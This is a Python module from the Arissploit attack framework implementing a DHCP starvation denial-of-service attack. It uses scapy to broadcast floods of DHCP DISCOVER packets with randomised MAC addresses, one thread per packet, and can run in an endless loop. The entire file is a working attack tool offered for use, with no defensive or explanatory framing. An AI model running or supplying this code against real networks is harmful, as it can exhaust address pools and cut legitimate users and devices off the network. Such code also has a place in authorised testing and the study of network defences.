#!/usr/bin/env python3

#            ---------------------------------------------------
#                           Arissploit Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core.arissploit import *
from core import colors
import threading, queue
from scapy.all import *
from scapy.all import conf as confs
import random

conf = {
	"name": "dhcp_dos", # Module's name (should be same as file name)
	"version": "1.0", # Module version
	"shortdesc": "DHCP denial of service.", # Short description
	"author": "Entynetproject", # Author
	"initdate": "01.01.2019", # Initial date
	"lastmod": "01.01.2019", # Last modification
	"apisupport": False, # Api support
	"needroot": 1, # Alert user if root permissions not available (remove variable below if root permissions not needed)
}

# List of the variables
variables = OrderedDict((
	('router', ['192.168.1.1', 'Router IP address.']),
	('packet_count', ['100', 'Count of packets [0 = infinite].']),
))

# Simple changelog
changelog = "Version 1.0:\nrelease"

class DhcpRequest(threading.Thread):
	last = 0
	router = None
	def __init__(self, router, last):
		self.router = router
		self.last = str(last)
		threading.Thread.__init__(self)

	def run(self):
		baseip = ".".join(self.router.split('.')[0:-1]) + '.'
		targetip = baseip+self.last
		confs.checkIPaddr = False
		hw = get_if_raw_hwaddr(confs.iface)
		dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/\
		IP(src="0.0.0.0",dst="255.255.255.255")/\
		UDP(sport=68,dport=67)/\
		BOOTP(chaddr=RandString(RandNum(1,50)))/\
		DHCP(options=[("message-type","discover"),"end"])
		sendp(dhcp_discover, verbose=0)

def run():
	printInfo("Attack has been started...")
	try:
		last = int(variables["packet_count"][0])
	except ValueError:
		printError("Invalid packets count!")
	threads = []
	try:
		if last != 0:
			for i in range(0, last):
				dhcpr = DhcpRequest(variables["router"][0], i+2)
				dhcpr.start()
				threads.append(dhcpr)

		else:
			i = 2
			while 1:
				dhcpr = DhcpRequest(variables["router"][0], i)
				dhcpr.start()
				threads.append(dhcpr)
				i += 1
	except KeyboardInterrupt:
		printInfo("Kill signal received, stopping attack...")
		for thread in threads:
			thread.join()
	printInform("Attack stopped.")
